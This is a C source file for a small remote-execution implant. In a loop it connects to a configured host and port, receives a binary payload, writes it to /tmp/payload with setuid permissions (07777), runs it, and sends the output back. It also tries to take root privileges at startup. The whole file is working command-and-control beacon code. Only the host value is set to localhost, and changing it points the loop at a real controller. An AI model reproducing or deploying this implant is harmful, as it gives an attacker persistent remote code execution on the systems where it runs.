#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <unistd.h>

#define LOG(fmt, ...) printf(fmt "\n", ##__VA_ARGS__)
#define SLEEP_TIME    5
#define HOST          "127.0.0.1"
#define PORT          8000
#define PAYLOAD_PATH  "/tmp/payload"

int execute(char* payload, int payload_size, char** product, int* product_size)
{
    FILE* fp;
    char* p;
    int   size;
    int   max_size;
    char  buff[1024] = {0};

    LOG("opening %s", PAYLOAD_PATH);
    if ((fp = fopen(PAYLOAD_PATH, "w")) == NULL) {
        perror("fopen payload");
        return -1;
    }

    LOG("writing %d bytes of payload", payload_size);
    if (fwrite(payload, 1, payload_size, fp) == -1) {
        perror("fwrite payload");
        fclose(fp);
        return -1;
    }

    fclose(fp);

    LOG("making payload executable");
    if (chmod(PAYLOAD_PATH, 07777) == -1) {
        perror("chmod payload");
        return -1;
    }
    
    LOG("executing payload");
    if ((fp = popen(PAYLOAD_PATH, "re")) == NULL) {
        perror("popen");
        return -1;
    }

    max_size = 1024;

    LOG("allocating %d bytes for product", max_size);
    if ((*product = malloc(max_size)) == NULL) {
        perror("malloc product");
        pclose(fp);
        return -1;
    }

    size = *product_size = 0;

    while (1) {

        LOG("reading line of output");
        if (fgets(buff, sizeof(buff), fp) == NULL) {
            break;
        }

        size = strlen(buff);
        LOG("read %d bytes", size);

        if (*product_size+size >= max_size) {
            max_size *= 2;
            LOG("reallocating %d bytes for product", max_size);
            if ((p = realloc(*product, max_size)) == NULL) {
                perror("realloc product");
                pclose(fp);
                free(*product);
                return -1;
            }
            *product = p;
        }

        memcpy(*product+*product_size, buff, size);
        *product_size += size;
    }

    pclose(fp);
    return 0;
}

void communicate()
{
    int    sock;
    int    payload_size;
    int    product_size;
    char*  payload = NULL;
    char*  product = NULL;
    struct sockaddr_in addr = {0};

    sock = socket(AF_INET, SOCK_STREAM, 0);

    addr.sin_family      = AF_INET;
    addr.sin_port        = htons(PORT);
    addr.sin_addr.s_addr = inet_addr(HOST);

    LOG("connecting to %s:%d", HOST, PORT);
    if (connect(sock, (struct sockaddr*) &addr, sizeof(addr)) == -1) {
        perror("connect");
        goto end;
    }

    LOG("receiving %d bytes of payload size", sizeof(int));
    if (recv(sock, &payload_size, sizeof(int), 0) == -1) {
        perror("receive payload size");
        goto close_socket;
    }

    LOG("allocating %d bytes for payload", payload_size);
    if ((payload = malloc(payload_size)) == NULL) {
        perror("allocate payload");
        goto free_payload;
    }

    LOG("receiving %d bytes of payload", payload_size);
    if (recv(sock, payload, payload_size, 0) == -1) {
        perror("receive payload");
        goto free_payload;
    }

    LOG("executing payload");
    if (execute(payload, payload_size, &product, &product_size) == -1) {
        perror("execute");
        goto free_payload;
    }

    LOG("sending %d bytes of product size", sizeof(product_size));
    if (send(sock, &product_size, sizeof(product_size), 0) == -1) {
        perror("send product size");
        goto free_product;
    }

    LOG("sending %d bytes of product", product_size);
    if (send(sock, product, product_size, 0) == -1) {
        perror("send product");
        goto free_product;
    }

free_product:
    free(product);
free_payload:
    free(payload);
close_socket:
    close(sock);
end:
    return;
}

int main()
{
    setuid(0);
    setgid(0);

    while (1) {

        LOG("communicating");
        communicate();

        LOG("sleeping %d seconds", SLEEP_TIME);
        sleep(SLEEP_TIME);

    }

    return 0;
}
